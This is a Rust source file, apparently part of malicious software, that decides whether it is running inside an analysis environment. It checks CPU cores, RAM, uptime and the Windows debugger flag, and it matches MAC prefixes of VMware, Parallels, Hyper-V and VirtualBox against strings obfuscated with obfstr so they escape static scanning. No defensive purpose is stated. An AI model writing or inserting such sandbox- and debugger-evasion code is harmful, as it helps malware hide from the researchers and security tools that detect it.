use sysinfo::{System, Networks};
use num_cpus;

#[cfg(windows)]
use winapi::um::debugapi::IsDebuggerPresent;

pub fn is_analysis_environment() -> bool {
    if check_hardware() { return true; }
    if check_uptime() { return true; }
    if check_debugger() { return true; }
    if check_mac_oui() { return true; }
    false
}

fn check_hardware() -> bool {
    // 1. CPU Cores (< 2 is suspicious)
    if num_cpus::get() < 2 { return true; }

    // 2. RAM (< 3.5GB is suspicious)
    let mut sys = System::new_all();
    sys.refresh_memory();
    let total_ram_gb = sys.total_memory() / 1024 / 1024;
    if total_ram_gb < 3500 { return true; }
    
    false
}

fn check_uptime() -> bool {
    // Sandboxes often have very short uptime (< 10 mins)
    // Real user systems usually stay on.
    let uptime = System::uptime();
    if uptime < 600 { // 10 minutes
        return true; 
    }
    false
}

fn check_mac_oui() -> bool {
    // Check MAC addresses for common VM vendors
    // 00:05:69, 00:0C:29, 00:1C:14, 00:50:56 (VMware)
    // 00:1C:42 (Parallels)
    // 00:15:5D (Hyper-V)
    // 08:00:27 (VirtualBox)
    use obfstr::obfstr;
    let networks = Networks::new_with_refreshed_list();
    for (_, network) in &networks {
        let mac = network.mac_address().to_string().to_uppercase();
        // Simple prefix check
        if mac.starts_with(obfstr!("00:05:69")) || mac.starts_with(obfstr!("00:0C:29")) || mac.starts_with(obfstr!("00:1C:14")) || mac.starts_with(obfstr!("00:50:56")) // VMware
        || mac.starts_with(obfstr!("00:1C:42")) // Parallels
        || mac.starts_with(obfstr!("00:15:5D")) // Hyper-V
        || mac.starts_with(obfstr!("08:00:27")) // VirtualBox
        {
            return true;
        }
    }
    false
}

fn check_debugger() -> bool {
    #[cfg(windows)]
    unsafe {
        if IsDebuggerPresent() != 0 {
            return true;
        }
    }
    false
}
